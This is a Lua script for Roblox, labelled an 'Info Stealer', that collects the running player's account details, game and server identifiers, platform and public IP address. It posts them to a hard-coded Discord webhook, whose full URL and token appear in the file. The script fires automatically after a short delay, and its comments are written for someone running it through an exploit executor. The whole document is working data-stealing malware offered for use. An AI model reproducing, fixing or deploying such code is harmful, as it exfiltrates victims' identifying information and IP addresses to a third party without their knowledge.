--[=[ Roblox Info Stealer – Fixed Version ]=]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Your webhook (plain text – no encoding)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1527799897741332631/GHyVnuLK7boBHeHjjgCrTAYkkqwsu5yZuVInYPyGPI-NPdQo19XRsUkZmBxfxUsnrjgU"

-- Collect data
local function collectInfo()
    local data = {
        player = {
            userId = LocalPlayer.UserId,
            name = LocalPlayer.Name,
            displayName = LocalPlayer.DisplayName,
            accountAge = LocalPlayer.AccountAge,
            membership = tostring(LocalPlayer.MembershipType),
        },
        game = {
            placeId = game.PlaceId,
            jobId = game.JobId,
            gameId = game.GameId,
            creatorId = game.CreatorId,
            creatorType = game.CreatorType,
            name = game.Name,
        },
        client = {
            platform = tostring(UIS:GetPlatform()),
            screen = tostring(Camera.ViewportSize),
        },
        timestamp = os.time(),
    }
    -- Optional: try IP
    pcall(function()
        local ip = HttpService:GetAsync("https://api.ipify.org?format=json")
        data.ip = ip
    end)
    return data
end

-- Send data using http_request (works on your executor)
local function sendData()
    local json = HttpService:JSONEncode(collectInfo())
    local response = http_request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
    -- Print status so you know it worked
    print("📤 Status: " .. (response.StatusCode or "Unknown"))
    if response.StatusCode == 204 or response.StatusCode == 200 then
        print("✅ Data sent to Discord!")
    else
        print("❌ Failed. Check webhook URL.")
    end
end

-- Run after a short delay
task.wait(2)
sendData()

